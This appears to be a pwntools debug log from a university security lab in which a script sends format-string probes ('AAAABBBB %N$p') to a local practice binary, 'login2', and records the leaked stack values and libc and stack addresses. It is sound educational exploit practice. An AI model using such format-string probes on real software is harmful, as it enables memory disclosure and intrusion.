@@ -1,0 +1,1808 @@
+[*] '/home/k-730/COMP6841/wk4/login2/login2'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996051
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x14 bytes:
+    b'AAAABBBB %0$p, %0$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[DEBUG] Received 0x57 bytes:
+    b'AAAABBBB %0$p, %0$x\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 87B
+[*] Process './login2' stopped with exit code 0 (pid 996051)
+[+] Receiving all data: Done (87B)
+0 : b"AAAABBBB %0$p, %0$x\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996052
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x14 bytes:
+    b'AAAABBBB %1$p, %1$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996052)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0x706d6574, 706d6574\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+1 : b"AAAABBBB 0x706d6574, 706d6574\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996053
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x14 bytes:
+    b'AAAABBBB %2$p, %2$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996053)
+[DEBUG] Received 0x5f bytes:
+    b'AAAABBBB 0xa333231, a333231\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 95B
+[+] Receiving all data: Done (95B)
+2 : b"AAAABBBB 0xa333231, a333231\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996054
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x14 bytes:
+    b'AAAABBBB %3$p, %3$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[*] Process './login2' stopped with exit code 0 (pid 996054)
+[+] Receiving all data: Done (85B)
+3 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996055
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x14 bytes:
+    b'AAAABBBB %4$p, %4$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996055)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+4 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996056
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x14 bytes:
+    b'AAAABBBB %5$p, %5$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996056)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+5 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996057
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x14 bytes:
+    b'AAAABBBB %6$p, %6$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996057)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+6 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996058
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x14 bytes:
+    b'AAAABBBB %7$p, %7$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996058)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+7 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996059
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x14 bytes:
+    b'AAAABBBB %8$p, %8$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996059)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+8 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996060
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x14 bytes:
+    b'AAAABBBB %9$p, %9$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996060)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+9 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996061
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %10$p, %10$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996061)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+10 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996062
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %11$p, %11$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996062)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0x41414141, 41414141\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+11 : b"AAAABBBB 0x41414141, 41414141\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996063
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %12$p, %12$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996063)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0x42424242, 42424242\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+12 : b"AAAABBBB 0x42424242, 42424242\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996064
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %13$p, %13$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996064)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0x33312520, 33312520\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+13 : b"AAAABBBB 0x33312520, 33312520\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996065
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %14$p, %14$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996065)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0x202c7024, 202c7024\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+14 : b"AAAABBBB 0x202c7024, 202c7024\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996066
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %15$p, %15$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996066)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0x24353125, 24353125\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+15 : b"AAAABBBB 0x24353125, 24353125\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996067
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %16$p, %16$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996067)
+[DEBUG] Received 0x57 bytes:
+    b'AAAABBBB 0xa78, a78\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 87B
+[+] Receiving all data: Done (87B)
+16 : b"AAAABBBB 0xa78, a78\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996068
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %17$p, %17$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996068)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+17 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996069
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %18$p, %18$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[*] Process './login2' stopped with exit code 0 (pid 996069)
+[+] Receiving all data: Done (85B)
+18 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996070
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %19$p, %19$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996070)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+19 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996071
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %20$p, %20$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996071)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+20 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996072
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %21$p, %21$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996072)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+21 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996073
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %22$p, %22$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996073)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+22 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996074
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %23$p, %23$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996074)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+23 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996075
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %24$p, %24$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996075)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+24 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996076
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %25$p, %25$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996076)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+25 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996077
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %26$p, %26$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996077)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+26 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996078
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %27$p, %27$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996078)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+27 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996079
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %28$p, %28$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996079)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+28 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996080
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %29$p, %29$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996080)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+29 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996081
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %30$p, %30$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996081)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+30 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996082
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %31$p, %31$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996082)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+31 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996083
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %32$p, %32$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996083)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+32 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996084
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %33$p, %33$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996084)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+33 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996085
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %34$p, %34$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996085)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+34 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996086
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %35$p, %35$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996086)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+35 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996087
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %36$p, %36$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996087)
+[DEBUG] Received 0x5f bytes:
+    b'AAAABBBB 0x95881a0, 95881a0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 95B
+[+] Receiving all data: Done (95B)
+36 : b"AAAABBBB 0x95881a0, 95881a0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996088
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %37$p, %37$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996088)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xf7ee7e14, f7ee7e14\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+37 : b"AAAABBBB 0xf7ee7e14, f7ee7e14\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996089
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %38$p, %38$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996089)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xffe1da48, ffe1da48\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+38 : b"AAAABBBB 0xffe1da48, ffe1da48\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996090
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %39$p, %39$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996090)
+[DEBUG] Received 0x5f bytes:
+    b'AAAABBBB 0x80493a2, 80493a2\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 95B
+[+] Receiving all data: Done (95B)
+39 : b"AAAABBBB 0x80493a2, 80493a2\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996091
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %40$p, %40$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996091)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+40 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996092
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %41$p, %41$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996092)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xf7d23cc3, f7d23cc3\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+41 : b"AAAABBBB 0xf7d23cc3, f7d23cc3\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996093
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %42$p, %42$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996093)
+[DEBUG] Received 0x53 bytes:
+    b'AAAABBBB 0x1, 1\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 83B
+[+] Receiving all data: Done (83B)
